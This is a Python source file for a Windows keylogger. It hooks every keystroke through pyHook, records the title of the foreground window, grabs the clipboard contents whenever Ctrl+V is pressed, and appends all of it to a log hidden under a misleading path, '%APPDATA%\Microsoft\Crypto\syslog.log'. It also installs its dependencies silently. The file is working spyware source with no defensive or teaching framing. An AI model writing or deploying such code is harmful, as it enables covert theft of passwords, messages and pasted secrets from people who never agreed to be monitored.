from __future__ import print_function
from ctypes import *
import os 
from time import sleep
try:
    import pythoncom
    import win32clipboard #pip install pywin32
except:
    print("Exception")
    os.system("pip install pywin32 >> %s\\tmp", os.getenv("TMP"))
    sleep(5)
    import win32clipboard
    import pythoncom
try:
    import pyHook         #pip install pyHook-1.5 ....
except:
    os.system("pip install pyHook-1.5")
    sleep(5)
    import pyHook

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = ""
KeyfileName = os.getenv("APPDATA")+"\\Microsoft\Crypto\\syslog.log"

ctrl  = False
alt   = False
shift = False
capOn = False

def get_current_process():
    try:
        log = open(KeyfileName, "a")
        # get a handle to the foreground window
        hwnd = user32.GetForegroundWindow()
        # grab the executable
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))   # find the process ID
        process_id = "%d" % pid.value
        executable = create_string_buffer(b'00', 512) #"\x00",
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        # now read its title
        window_title =create_string_buffer(b'00', 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    except:
        log.write("Exception has been raised in get_current_process()!")
        exit(1)
    log.write("\n[ %s : %s ]\n" % (executable.value.decode(), window_title.value.decode()))

    log.close()
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    global current_window
    global ctrl, alt, shift
    log = open(KeyfileName, "a")

    if event.WindowName != current_window:
        current_window = event.WindowName
        log.write(current_window + "\n")
        #get_current_process() 

    if len(event.Key)==1 : #and ord(event.Key) > 32 and ord(event.Key) < 127:
        if event.Key == 'V' and ctrl == True:
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            log.write("[<PASTE> %s]" % (pasted_value))
        else:
            #TODO: check if shift was pressed
            log.write("[%s]" % event.Key)
        ctrl = False 
    else:
        # if [Ctrl-V], get the value on the clipboard
        if "control" in event.Key:
            ctrl = True
        elif "menu" in event.Key:
            alt = True
        elif "shift" in event.Key:
            shift = True
        else:
            pass #print(event.Key)
        log.write("[%s]" % event.Key)
            
    
    log.close() # close file and pass execution to next hook registered
    return True

# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()


